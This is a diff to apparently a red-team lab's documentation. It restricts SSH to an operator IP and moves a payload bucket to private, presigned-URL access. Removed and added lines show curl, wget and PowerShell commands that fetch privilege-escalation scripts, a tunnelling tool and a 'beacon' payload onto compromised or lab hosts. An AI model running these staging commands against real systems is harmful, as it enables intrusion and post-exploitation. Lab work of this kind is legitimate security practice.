@@ -133,6 +133,8 @@ Operator public IP:
 190.18.171.24/32
 ```
 
+This value is used to restrict SSH management access via the `ssh_cidr_blocks` variable (set in `CORE`/`LAB01`/`LAB02` `terraform.tfvars` as needed).
+
 WireGuard network:
 
 ```
@@ -479,10 +481,15 @@ Purpose:
 * script distribution
 * binary delivery
 
-Example payload URL:
+Access model:
+
+* The bucket is **private-by-default**.
+* Short-lived **presigned URLs** are used for controlled downloads.
+
+Example payload URL (presigned):
 
 ```
-https://redteam-lab-payloads.s3.amazonaws.com/b/beacon
+<PRESIGNED_URL_TO_b/beacon>
 ```
 
 ---
@@ -532,23 +539,28 @@ b/
   beacon
 ```
 
-Example usage from compromised host:
+Example usage from a lab host (placeholders):
 
 ```
-curl -O https://redteam-lab-payloads.s3.amazonaws.com/l/linpeas.sh
+curl -fsSL "<PRESIGNED_URL_TO_l/linpeas.sh>" -o linpeas.sh
 ```
 
 or
 
 ```
-wget https://redteam-lab-payloads.s3.amazonaws.com/p/chisel
+wget "<PRESIGNED_URL_TO_p/chisel>"
 ```
 
 Windows example:
 
 ```
-powershell iwr https://redteam-lab-payloads.s3.amazonaws.com/w/winpeas.exe -OutFile winpeas.exe
+powershell iwr "<PRESIGNED_URL_TO_w/winpeas.exe>" -OutFile winpeas.exe
 ```
+
+See:
+
+* `docs/user-guide/07-s3-staging.md` (presign workflow)
+* `docs/beacon_commands.txt` (download placeholders tied to S3 inventory)
 
 ---
 
